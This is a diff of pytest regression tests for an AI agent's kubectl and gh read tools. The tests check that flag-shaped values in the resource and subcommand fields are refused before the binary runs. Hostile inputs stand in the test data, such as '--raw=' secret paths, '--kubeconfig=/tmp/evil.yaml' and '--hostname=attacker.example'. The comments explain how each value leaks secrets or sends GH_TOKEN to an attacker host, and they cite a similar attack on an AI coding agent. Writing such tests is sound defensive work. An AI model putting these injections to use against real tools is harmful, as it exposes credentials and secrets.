@@ -686,6 +686,117 @@ def test_github_read_forces_get_on_api_calls(runner):
     assert captured["cmd"] == ["gh", "api", "/repos/SokratesAI/agora", "--method", "GET"]
 
 
+# ---------------------------------------------------------------------------
+# Idea #328 (cycle 1923) -- flag injection through the fields the allowlists
+# never looked at. Both tools validated `args` and let `resource` /
+# `subcommand` reach argv untouched, which is the shape Black Hat 2026 used
+# against Claude Code's `git push --receive-pack=`. All four cases below were
+# reproduced live against the real tools before the guard was written:
+# kubectl `--raw=` returned the raw API response, kubectl `--kubeconfig=`
+# reached the binary (an exec credential plugin in that file runs a command),
+# and gh `--hostname=` -- through BOTH `subcommand` and `args` -- made gh
+# connect to a chosen host with GH_TOKEN in its environment.
+#
+# Each asserts the binary was never invoked, not merely that the string came
+# back with "not allowed" in it: a refusal that still ran the command is the
+# failure these guard against.
+# ---------------------------------------------------------------------------
+
+def _never_runs(runner):
+    """Patch subprocess.run to fail loudly. A guard that refuses AFTER
+    spawning the binary has not guarded anything."""
+    def boom(*a, **k):
+        raise AssertionError(f"the binary was invoked despite the guard: {a[0]!r}")
+    return patch.object(runner.subprocess, "run", side_effect=boom)
+
+
+def test_kubectl_read_rejects_a_flag_in_the_resource_field(runner):
+    with _never_runs(runner):
+        for resource in (
+            "--raw=/api/v1/namespaces/agents/secrets",
+            "--kubeconfig=/tmp/evil.yaml",
+            "--server=https://attacker.example",
+            "--token=stolen",
+            "-o=json",
+        ):
+            result = runner.kubectl_read({"verb": "get", "resource": resource})
+            assert "looks like a flag" in result, resource
+
+
+def test_kubectl_read_secret_guard_did_not_see_the_raw_flag(runner):
+    """The pre-1923 hole, stated as its own case: the Secret check reads
+    `resource`, and '--raw=/api/v1/.../secrets'.split('/')[0] is '--raw=',
+    which does not start with 'secret'. So the Secret guard passed it."""
+    resource = "--raw=/api/v1/namespaces/agents/secrets"
+    assert not resource.split("/")[0].split(".")[0].lower().startswith("secret")
+    with _never_runs(runner):
+        assert "looks like a flag" in runner.kubectl_read({"verb": "get", "resource": resource})
+
+
+def test_kubectl_read_still_accepts_an_ordinary_resource(runner):
+    """Positive control -- the guard must not refuse the normal call."""
+    captured = {}
+
+    def fake_run(cmd, capture_output, text, timeout):
+        captured["cmd"] = cmd
+        class R:
+            stdout = "ok"
+            stderr = ""
+            returncode = 0
+        return R()
+
+    with patch.object(runner.subprocess, "run", side_effect=fake_run):
+        runner.kubectl_read({"verb": "get", "resource": "pod/agora-1", "namespace": "agents"})
+    assert captured["cmd"] == ["kubectl", "get", "pod/agora-1", "-n", "agents"]
+
+
+def test_github_read_rejects_a_flag_in_the_subcommand_field(runner):
+    with _never_runs(runner):
+        with patch.object(runner.tools_github, "GITHUB_READONLY_TOKEN", "fake-token"):
+            result = runner.github_read({
+                "command": "api", "subcommand": "--hostname=attacker.example", "args": ["/user"],
+            })
+    assert "looks like a flag" in result
+
+
+def test_github_read_args_are_allowlisted_not_denylisted(runner):
+    """`--hostname` is not in the three forbidden prefixes, so the old
+    denylist passed it and gh dialled an attacker-chosen host carrying
+    GH_TOKEN. Anything flag-shaped now has to be named."""
+    with _never_runs(runner):
+        with patch.object(runner.tools_github, "GITHUB_READONLY_TOKEN", "fake-token"):
+            for flag in ("--hostname=attacker.example", "--config=/tmp/x", "-H", "--web"):
+                result = runner.github_read({
+                    "command": "api", "subcommand": "/user", "args": [flag],
+                })
+                assert "not allowed" in result, flag
+
+
+def test_github_read_still_accepts_its_documented_args(runner):
+    """Positive control -- the tool's own description tells callers to pass
+    ['-f', 'per_page=1'], and a positional value is not a flag."""
+    captured = {}
+
+    def fake_run(cmd, capture_output, text, timeout, env):
+        captured["cmd"] = cmd
+        class R:
+            stdout = "[]"
+            stderr = ""
+            returncode = 0
+        return R()
+
+    with patch.object(runner.tools_github, "GITHUB_READONLY_TOKEN", "fake-token"):
+        with patch.object(runner.subprocess, "run", side_effect=fake_run):
+            runner.github_read({
+                "command": "api",
+                "subcommand": "/repos/SokratesAI/agora/commits",
+                "args": ["-f", "per_page=1"],
+            })
+    assert captured["cmd"] == [
+        "gh", "api", "/repos/SokratesAI/agora/commits", "--method", "GET", "-f", "per_page=1",
+    ]
+
+
 def test_github_read_without_token_degrades_gracefully(runner):
     with patch.object(runner.tools_github, "GITHUB_READONLY_TOKEN", ""):
         result = runner.github_read({"command": "pr", "subcommand": "list"})
